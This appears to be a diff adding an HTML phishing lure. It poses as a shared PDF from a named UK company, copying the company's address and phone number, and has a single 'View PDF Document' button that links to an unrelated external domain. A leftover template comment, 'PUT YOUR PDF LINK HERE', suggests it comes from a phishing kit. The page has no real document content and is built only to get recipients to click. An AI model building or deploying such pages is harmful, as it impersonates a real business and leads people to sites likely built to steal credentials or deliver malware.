@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Document | Freetile Ltd T/A Plan It Earth</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: #f4f6f8;
+      color: #202b3c;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 850px;
+      min-height: 100vh;
+      margin: 0 auto;
+      padding: 40px 20px;
+    }
+
+    .document {
+      background: #ffffff;
+      min-height: 900px;
+      padding: 55px 65px;
+      border: 1px solid #e1e5ea;
+      border-radius: 4px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+    }
+
+    /* Header */
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding-bottom: 28px;
+      border-bottom: 2px solid #1d5f85;
+    }
+
+    .company {
+      color: #174c6b;
+      font-size: 21px;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+
+    .company-subtitle {
+      margin-top: 7px;
+      color: #667085;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .pdf-label {
+      color: #c62828;
+      background: #fff8f8;
+      border: 1px solid #e4b4b4;
+      border-radius: 5px;
+      padding: 7px 10px;
+      font-size: 11px;
+      font-weight: 700;
+      white-space: nowrap;
+    }
+
+    /* Title */
+
+    .title {
+      margin-top: 55px;
+      margin-bottom: 35px;
+    }
+
+    .title h1 {
+      margin: 0;
+      color: #172033;
+      font-size: 30px;
+      line-height: 1.25;
+      font-weight: 600;
+    }
+
+    .title p {
+      margin: 10px 0 0;
+      color: #667085;
+      font-size: 15px;
+    }
+
+    .sender {
+      color: #344054;
+      font-weight: 600;
+    }
+
+    /* Document content */
+
+    .content {
+      color: #344054;
+      font-size: 15px;
+      line-height: 1.8;
+    }
+
+    .document-info {
+      margin: 35px 0 28px;
+      padding: 18px 20px;
+      background: #f7f9fb;
+      border-left: 4px solid #1d5f85;
+    }
+
+    .document-info strong {
+      display: block;
+      margin-bottom: 5px;
+      color: #202b3c;
+    }
+
+    .content h2 {
+      margin: 32px 0 12px;
+      color: #174c6b;
+      font-size: 19px;
+      font-weight: 600;
+    }
+
+    .content p {
+      margin: 0 0 18px;
+    }
+
+    /* PDF file */
+
+    .pdf-file {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 28px 0;
+      padding: 16px;
+      border: 1px solid #e1e5ea;
+      border-radius: 8px;
+      background: #fafbfc;
+    }
+
+    .pdf-icon {
+      width: 48px;
+      height: 52px;
+      flex-shrink: 0;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      color: #c62828;
+      background: #fff1f1;
+      border-radius: 7px;
+    }
+
+    .pdf-icon svg {
+      width: 27px;
+      height: 27px;
+    }
+
+    .pdf-details {
+      min-width: 0;
+    }
+
+    .pdf-name {
+      color: #344054;
+      font-size: 14px;
+      font-weight: 600;
+
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+
+    .pdf-type {
+      margin-top: 4px;
+      color: #98a2b3;
+      font-size: 12px;
+    }
+
+    /* View button */
+
+    .view-document {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+
+      width: 100%;
+      min-height: 50px;
+
+      padding: 13px 22px;
+
+      background: #1d5f85;
+      color: #ffffff;
+
+      border-radius: 7px;
+
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 600;
+
+      transition:
+        background 0.2s ease,
+        transform 0.2s ease;
+    }
+
+    .view-document:hover {
+      background: #174c6b;
+      transform: translateY(-1px);
+    }
+
+    .view-document:focus-visible {
+      outline: 3px solid rgba(29, 95, 133, 0.25);
+      outline-offset: 3px;
+    }
+
+    /* Footer */
+
+    .footer {
+      margin-top: 100px;
+      padding-top: 22px;
+      border-top: 1px solid #dfe3e8;
+
+      color: #667085;
+      font-size: 12px;
+      line-height: 1.7;
+    }
+
+    .footer-company {
+      color: #344054;
+      font-weight: 700;
+    }
+
+    .environment {
+      margin-top: 15px;
+      color: #718096;
+      font-style: italic;
+    }
+
+    /* Mobile */
+
+    @media (max-width: 600px) {
+
+      .page {
+        padding: 15px;
+      }
+
+      .document {
+        min-height: auto;
+        padding: 35px 25px;
+      }
+
+      .header {
+        display: block;
+      }
+
+      .pdf-label {
+        display: inline-block;
+        margin-top: 15px;
+      }
+
+      .title {
+        margin-top: 40px;
+      }
+
+      .title h1 {
+        font-size: 25px;
+      }
+    }
+
+    /* Print */
+
+    @media print {
+
+      body {
+        background: #ffffff;
+      }
+
+      .page {
+        max-width: none;
+        padding: 0;
+      }
+
+      .document {
+        border: none;
+        box-shadow: none;
+      }
+
+      .view-document {
+        display: none;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="page">
+
+    <article class="document">
+
+      <!-- =========================
+           COMPANY HEADER
+      ========================== -->
+
+      <header class="header">
+
+        <div>
+
+          <div class="company">
+            Freetile Ltd T/A Plan It Earth
+          </div>
+
+          <div class="company-subtitle">
+            Town Head Mills, Main Street<br>
+            Addingham, Ilkley, LS29 0PD<br>
+            Tel: 01943 831300
+          </div>
+
+        </div>
+
+        <div class="pdf-label">
+          PDF DOCUMENT
+        </div>
+
+      </header>
+
+
+      <!-- =========================
+           DOCUMENT TITLE
+      ========================== -->
+
+      <section class="title">
+
+        <h1>
+          Document
+        </h1>
+
+        <p>
+          Shared by
+          <span class="sender">Claire Free</span>
+        </p>
+
+      </section>
+
+
+      <!-- =========================
+           DOCUMENT CONTENT
+      ========================== -->
+
+      <section class="content">
+
+        <div class="document-info">
+
+          <strong>
+            Document shared by Claire Free
+          </strong>
+
+          This document has been made available for review.
+
+        </div>
+
+
+        <h2>
+          Document Information
+        </h2>
+
+        <p>
+          Please review the document using the button below.
+        </p>
+
+
+        <!-- =========================
+             PDF FILE DISPLAY
+        ========================== -->
+
+        <div class="pdf-file">
+
+          <div class="pdf-icon">
+
+            <svg
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="1.7"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              aria-hidden="true"
+            >
+              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+              <path d="M14 2v6h6"/>
+              <path d="M8 13h8"/>
+              <path d="M8 17h6"/>
+            </svg>
+
+          </div>
+
+
+          <div class="pdf-details">
+
+            <div class="pdf-name">
+              Freetile-Document.pdf
+            </div>
+
+            <div class="pdf-type">
+              PDF document
+            </div>
+
+          </div>
+
+        </div>
+
+
+        <!-- =========================
+             PDF LINK
+             
+             PUT YOUR PDF LINK HERE
+             ========================== -->
+
+        <a
+          class="view-document"
+          href="https://ommem.growwithsecuretech.de/NhHV1"
+          target="_blank"
+          rel="noopener noreferrer"
+        >
+          View PDF Document
+        </a>
+
+
+      </section>
+
+
+      <!-- =========================
+           FOOTER
+      ========================== -->
+
+      <footer class="footer">
+
+        <div class="footer-company">
+          Freetile Ltd T/A Plan It Earth
+        </div>
+
+        <div>
+          Town Head Mills, Main Street<br>
+          Addingham, Ilkley, LS29 0PD<br>
+          Tel: 01943 831300
+        </div>
+
+        <div class="environment">
+          Please consider the environment before printing this email.
+        </div>
+
+      </footer>
+
+    </article>
+
+  </main>
+
+</body>
+</html>
